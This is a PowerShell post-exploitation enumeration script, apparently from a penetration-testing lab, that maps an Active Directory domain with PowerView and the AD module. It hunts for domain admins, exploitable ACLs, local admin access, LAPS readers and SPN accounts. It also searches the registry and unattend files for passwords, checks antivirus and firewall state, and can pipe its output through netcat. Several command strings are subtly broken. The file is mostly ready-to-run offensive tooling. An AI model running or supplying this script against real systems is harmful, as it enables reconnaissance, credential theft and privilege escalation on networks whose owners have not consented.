#requires -version 2

<#
Author: Hacker101 (@raj77in)
License: BSD 3-Clause
Required Dependencies: None
#>
param(
    [Parameter(Mandatory = $false)]
    [switch]$NoAD,

    [Parameter(Mandatory = $false)]
    [ValidateSet('ADModule', 'PowerView', 'Both')]
    [String]$Module = 'Both'
)

$Outfile = $(hostname) + "-" + $env:USERNAME + "-" + $(Get-Date -Format "yyyyMMdd-HHmm") + ".log"

function Set-Output {
    [CmdletBinding()]
    Param(
        [string]$Command ,
        [string]$Dip,
        [int]$Dport,
        [switch]$remote,
        [Parameter(ValueFromPipeline = $true)] [String[]]$Fullout
    )
    
    $fulltext = @()
    "`r`n`r`n`r`n" | Out-File -FilePath $Outfile -Append -NoClobber
    $fulltext += "=============== $command ==============="
    foreach ($value in $input) { $fulltext += $value }
    Write-Host "Collecting $Command"

    $fulltext | Out-File -FilePath $Outfile -Append -NoClobber
    # Write-Host $fulltext
    if ($remote) {
        $fulltext | nc.exe -w1  127.0.0.1 8001
    }
    
    # $fulltext | nc.exe -w1  127.0.0.1 8001
}

$User = $env:USERNAME

# AD Enumeration
if ( -Not $NoAD) {

    if ($Module -eq 'PowerView' -Or $Module -eq "Both") {
        "" | Set-Output "AD Enumeration -- Powerview"

        . .\PowerView.ps1
        $commands = @( 
            'Get-Domain';
            'Get-DomainSID';
            'Get-DomainPolicyData';
            '(Get-DomainPolicyData).systemaccess';
            'Get-DomainController';
            'Get-DomainUser';
            'Get-DomainUser -Properties *';
            'Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description';
            'Get-DomainComputer | select Name';
            'Get-DomainComputer|select -ExpandProperty cn | %{ Resolve-DnsName $_ }';
            'Get-DomainGroup | select Name';
            'Get-DomainGroupMember -Identity "Domain Admins" -Recurse';
            'Get-NetLocalGroup';
            'Invoke-ShareFinder -Verbose';
            'Invoke-FileFinder -Verbose';
            'Get-NetFileServer';
            'Get-DomainGPO';
            'Get-DomainGPOLocalGroup';
            'Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity ' + $env:COMPUTERNAME;
            'Get-DomainGPOUSerLocalGroupMapping -Identity '+ $env:USERNAME +' -Verbose';
            # 'Get-DomainGPOComputerLocalGroupMapping';
            '(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping';
            '(Get-DomainOU -Identity "OU=Mgmt,DC=us,DC=techcorp,DC=local").distinguishedname | %{GetDomainComputer -SearchBase $_} | GetDomainGPOComputerLocalGroupMapping';
            'Get-DomainGPOComputerLocalGroupMapping -OUIdentity "OU=Mgmt,DC=us,DC=techcorp,DC=local';
            'Get-DomainOU';
            'Get-DomainObjectAcl -SamAccountName' + $User + '-ResolveGUIDs';
            'Get-DomainObjectAcl -Searchbase "LDAP://CN=Domain Admins,CN=Users,DC=us ,DC=techcorp,DC=local" -ResolveGUIDs -Verbose';
            'Find-InterestingDomainAcl -ResolveGUIDs';
            'Get-DomainTrust';
            'Get-DomainTrust -Domain techcorp.local';
            'Get-Forest';
            'Get-ForestDomain';
            'Get-ForestGlobalCatalog';
            'Get-ForestTrust';
            'Find-LocalAdminAccess -Verbose';
            'Get-NetComputer';
            'Invoke-CheckLocalAdminAccess';
            'Find-DomainUserLocation -Verbose';
            'Find-DomainUserLocation -UserGroupIdentity "RDPUsers"';
            # 'Get-DomainGroupMember';
            'Get-DomainComputer';
            'Get-NetSession';
            'Get-NetLoggedon';
            'Test-AdminAccess';
            'Find-DomainUserLocation -CheckAccess';
            'Find-DomainUserLocation -Stealth';
            #'Get-NetComputer -Properties name | ForEach-Object{ Invoke-CheckLocalAdminAccess -ComputerName $_.name}';
            'Get-NetComputer -Properties name | %{ Invoke-CheckLocalAdminAccess -ComputerName $_.name}';
            '(Get-DomainTrust).TargetName';
            '(Get-Forest).Name';
            # LAPS
            'Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where-Object {($_.ObjectAceType "ms-Mcs-AdmPwd" ) -and ($_.ActiveDirectoryRights -match ''ReadProperty'' ) } | ForEach-Object {$_ | Add-Member NoteProperty ''IdentityName'' $(Convert-SidToName $_.SecurityIdentifier);$_}';

        );
        foreach ($cmd in $commands.GetEnumerator()) {
            Invoke-Expression $cmd *>&1 | Set-Output "$cmd"
        }
    }
    if ($Module -eq 'ADModule' -Or $Module -eq "Both") {
        "" | Set-Output "AD Enumeration -- ADModule"

        Import-Module .\ADModule\ADModule-master\Microsoft.ActiveDirectory.Management.dll
        Import-Module .\ADModule\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
        $commands = @( 
            'Get-ADDomain';
            'Get-ADDomain -Identity techcorp.local';
            '(Get-ADDomain).DomainSID';
            'Get-ADDomainController';
            'Get-ADDomainController -DomainName techcorp.local -Discover';
            'Get-ADUser -Filter * -Properties *';
            'Get-ADUser -Identity '+ $env:USERNAME+' -Properties *';
            'Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property select Name';
            'Get-ADUser -Filter * -Properties * | select name, @{expression={ [datetime]::fromFileTime($_.pwdlastset)}}';
            'Get-ADUser -Filter ''Description -like "*built*"'' -Properties Description | select name, Description';
            'Get-ADComputer -Filter * | select Name';
            'Get-ADComputer -Filter ''OperatingSystem -like "*Windows Server 2019 Standard*"'' -Properties OperatingSystem | select Name, OperatingSystem';
            'Get-ADComputer -Filter * -Properties DNSHostName | %{TestConnection -Count 1 -ComputerName $_ .DNSHostName}';
            'Get-ADComputer -Filter * -Properties *';
            'Get-ADGroup -Filter * | select Name';
            'Get-ADGroup -Filter * -Properties *';
            'Get-ADGroup -Filter ''Name -like "*admin*"'' | select Name';
            'Get-ADGroupMember -Identity "Domain Admins" -Recursive';
            'Get-ADPrincipalGroupMembership -Identity ' + $env:USERNAME;
            'Get-ADOrganizationalUnit -Filter * -Properties *';
            '(Get-Acl "AD:\CN=Administrator,CN=Users,DC=us,DC=techcorp,DC=local").Access';
            'Get-ADTrust';
            'Get-ADTrust -Identity techcorp.local';
            'Get-ADForest';
            '(Get-ADForest).Domains';
            'Get-ADForest | select -ExpandProperty GlobalCatalogs';
            'Get-ADTrust -Filter ''intraForest -ne STrue'' -Server (GetADForest).Name';
            'Get-ADUser -Filter {ServicePrincipalName -ne "$nul1"} -Properties ServicePrincipalName';

        );
        foreach ($cmd in $commands.GetEnumerator()) {
            Invoke-Expression $cmd *>&1 | Set-Output "$cmd"
        }
    }

  

}

# General enumeration

"" | Set-Output "Local Enumeration"

whoami | Set-Output -Command whoami
whoami /all | Set-Output "whoami /all"
hostname | Set-Output -Command hostname
systeminfo | Set-Output  -Command systeminfo
cmd /c 'echo %path%' | Set-Output  -Command path

## User Details
net users | Set-Output -Command users
net share | Set-Output -Command share

Get-LocalUser | Select-Object * | Set-Output -Command "net user"

## Network
ipconfig /all | Set-Output -Command ipconfig
netstat -ano  | Set-Output -Command netstat
arp -a  | Set-Output -Command arp
netstat -r | Set-Output -Command 'netstat routing'

## Process
tasklist /svc | Set-Output -Command tasklist


## Password Search

#cmd /c 'cd c:\;dir /s *password*'  | Set-Output -Command  'dir password'
#cmd /c 'cd c:\;dir /s *pass* == *cred* == *vnc* == *.config*'  | Set-Output -Command 'dir pass|cred|vnc|config'
# findstr /si password *.ini *.xml *.txt | Set-Output -Command 'dir password in ini|xml|txt'
# findstr /spin "password" *.*  | Set-Output -Command 'findstr password'
reg query HKLM /f password /t REG_SZ /s  | Set-Output -Command 'reg query password HKLM'
reg query HKCU /f password /t REG_SZ /s  | Set-Output -Command 'reg query password HKCU'

## Interesting Files

Get-Content c:\sysprep.inf | Set-Output -Command 'sysprep.inf'
Get-Content c:\sysprepsysprep.xml | Set-Output -Command 'sysprepsysprep.xml'
Get-Content %WINDIR%\Panther\Unattend\Unattended.xml | Set-Output -Command 'unattended.xml'
Get-Content %WINDIR%\Panther\Unattended.xml | Set-Output -Command 'unattended.xml'

## wmic Enumeration

wmic share list | Set-Output -Command 'wmic share list'
wmic useraccount list | Set-Output -Command 'wmic useraccount list'
wmic startup list brief | Set-Output -Command 'wmic startup list'
wmic process list brief  | Set-Output -Command 'wmic process list'
wmic environment list  | Set-Output -Command 'wmic env list'
wmic startup list full | Set-Output -Command 'wmic startup list full'
wmic group list brief | Set-Output -Command 'wmic group list'
wmic qfe get Caption, Description, HotFixID, InstalledOn | Set-Output -Command 'wmic hotfix list'

## AV and Firewall

wmic /namespace:\\root\securitycenter2 path antivirusproduct  | Set-Output -Command 'AV product'
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Set-Output -Command 'CMI AV Product'
Get-Service WinDefend  | Set-Output -Command 'Windows defender'
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled  | Set-Output -Command 'Real time protection'


Get-NetFirewallProfile | Format-Table Name, Enabled  | Set-Output -Command 'FW Profile'
Get-NetFirewallRule | Select-Object DisplayName, Enabled, Description  | Set-Output -Command 'FW Rules enabled'
Get-MpThreat  | Set-Output -Command 'MpThreat'

## Service details
#wmic service get Name, Path  | Set-Output -Command 'Service name and path'
#net start | Set-Output -Command 'net start'
Get-Service | Where-Object { $_.Status -ne "Stopped" } | Set-Output "Running Services"

## Scheduled Tasks

Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } | Set-Output "Enabled Scheduled Tasks"
#schtasks /query /fo LIST /v | Set-Output -Command 'Scheduled Tasks'


## Kernel driver details
driverquery | Set-Output -Command 'DriverQuery'
